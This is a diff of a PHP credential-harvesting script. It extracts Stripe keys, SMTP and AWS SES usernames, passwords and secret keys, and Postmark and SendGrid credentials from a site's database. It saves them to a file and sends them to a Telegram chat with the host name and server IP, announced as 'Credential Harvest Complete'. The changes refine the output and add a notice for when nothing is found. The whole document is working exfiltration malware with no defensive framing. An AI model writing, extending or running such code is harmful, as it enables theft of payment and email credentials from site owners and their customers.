@@ -426,9 +426,6 @@ if (!empty($stripe_keys)) {
 
 // Format AWS SES / SMTP
 if (!empty($aws_ses)) {
-    $output .= "[SMTP / AWS SES CREDENTIALS]\n";
-    $output .= str_repeat("-", 60) . "\n";
-    
     // Group credentials by type
     $smtp_config = [
         'host' => '',
@@ -493,39 +490,48 @@ if (!empty($aws_ses)) {
         }
     }
     
-    // Output grouped config
-    if ($smtp_config['host']) {
-        $output .= sprintf("%-20s: %s\n", "Host", $smtp_config['host']);
-    }
-    if ($smtp_config['port']) {
-        $output .= sprintf("%-20s: %s\n", "Port", $smtp_config['port']);
-    }
-    if ($smtp_config['username']) {
-        $output .= sprintf("%-20s: %s\n", "Username", $smtp_config['username']);
-    }
-    if ($smtp_config['password']) {
-        $output .= sprintf("%-20s: %s\n", "Password", $smtp_config['password']);
-    }
-    if ($smtp_config['from_email']) {
-        $output .= sprintf("%-20s: %s\n", "From Email", $smtp_config['from_email']);
-    }
-    if ($smtp_config['authentication']) {
-        $output .= sprintf("%-20s: %s\n", "Authentication", $smtp_config['authentication']);
-    }
+    // Check if we have actual SMTP credentials (not just email)
+    $has_smtp = $smtp_config['host'] || $smtp_config['username'] || $smtp_config['password'];
+    $has_aws = $smtp_config['aws_access_key'] || $smtp_config['aws_secret_key'];
     
-    // AWS SES if present
-    if ($smtp_config['aws_access_key']) {
+    if ($has_smtp || $has_aws) {
+        $output .= "[SMTP / AWS SES CREDENTIALS]\n";
+        $output .= str_repeat("-", 60) . "\n";
+        
+        // Output grouped config
+        if ($smtp_config['host']) {
+            $output .= sprintf("%-20s: %s\n", "Host", $smtp_config['host']);
+        }
+        if ($smtp_config['port']) {
+            $output .= sprintf("%-20s: %s\n", "Port", $smtp_config['port']);
+        }
+        if ($smtp_config['username']) {
+            $output .= sprintf("%-20s: %s\n", "Username", $smtp_config['username']);
+        }
+        if ($smtp_config['password']) {
+            $output .= sprintf("%-20s: %s\n", "Password", $smtp_config['password']);
+        }
+        if ($smtp_config['from_email']) {
+            $output .= sprintf("%-20s: %s\n", "From Email", $smtp_config['from_email']);
+        }
+        if ($smtp_config['authentication']) {
+            $output .= sprintf("%-20s: %s\n", "Authentication", $smtp_config['authentication']);
+        }
+        
+        // AWS SES if present
+        if ($smtp_config['aws_access_key']) {
+            $output .= "\n";
+            $output .= sprintf("%-20s: %s\n", "AWS Access Key", $smtp_config['aws_access_key']);
+        }
+        if ($smtp_config['aws_secret_key']) {
+            $output .= sprintf("%-20s: %s\n", "AWS Secret Key", $smtp_config['aws_secret_key']);
+        }
+        if ($smtp_config['aws_region']) {
+            $output .= sprintf("%-20s: %s\n", "AWS Region", $smtp_config['aws_region']);
+        }
+        
         $output .= "\n";
-        $output .= sprintf("%-20s: %s\n", "AWS Access Key", $smtp_config['aws_access_key']);
     }
-    if ($smtp_config['aws_secret_key']) {
-        $output .= sprintf("%-20s: %s\n", "AWS Secret Key", $smtp_config['aws_secret_key']);
-    }
-    if ($smtp_config['aws_region']) {
-        $output .= sprintf("%-20s: %s\n", "AWS Region", $smtp_config['aws_region']);
-    }
-    
-    $output .= "\n";
 }
 
 // Format Postmark
@@ -557,8 +563,11 @@ if (!empty($sendgrid)) {
 // Format Generic SMTP (already included in AWS SES section above)
 // Removed to avoid duplication
 
-if (empty($results)) {
-    $output .= "⚠️ No credentials found in database.\n\n";
+if (empty($stripe_keys) && empty($postmark) && empty($sendgrid) && !$has_smtp && !$has_aws) {
+    $output .= "[NO CREDENTIALS FOUND]\n";
+    $output .= str_repeat("-", 60) . "\n";
+    $output .= "No payment gateway or SMTP credentials found in database.\n";
+    $output .= "This site may use default settings or external mail services.\n\n";
 }
 
 $output .= str_repeat("=", 60) . "\n";
@@ -572,8 +581,15 @@ file_put_contents($outFile, $output);
 echo $output;
 
 // Send to Telegram
-send_telegram("✅ <b>Credential Harvest Complete</b>\n\nHost: $host_name\nFound: " . count($results) . " entries", $outFile);
-
-echo "\nSaved to: $outFile\n";
-echo "Sent to Telegram!\n";
+if (empty($stripe_keys) && empty($postmark) && empty($sendgrid) && !$has_smtp && !$has_aws) {
+    // No credentials found - just send message without file
+    send_telegram("⚠️ <b>No Credentials Found</b>\n\nHost: $host_name\nIP: $server_ip\n\nNo payment gateway or SMTP credentials found in database.");
+    echo "\nSaved to: $outFile\n";
+    echo "Sent to Telegram (no credentials found).\n";
+} else {
+    // Credentials found - send file
+    send_telegram("✅ <b>Credential Harvest Complete</b>\n\nHost: $host_name\nIP: $server_ip\nFound: " . count($results) . " entries", $outFile);
+    echo "\nSaved to: $outFile\n";
+    echo "Sent to Telegram!\n";
+}
 ?>
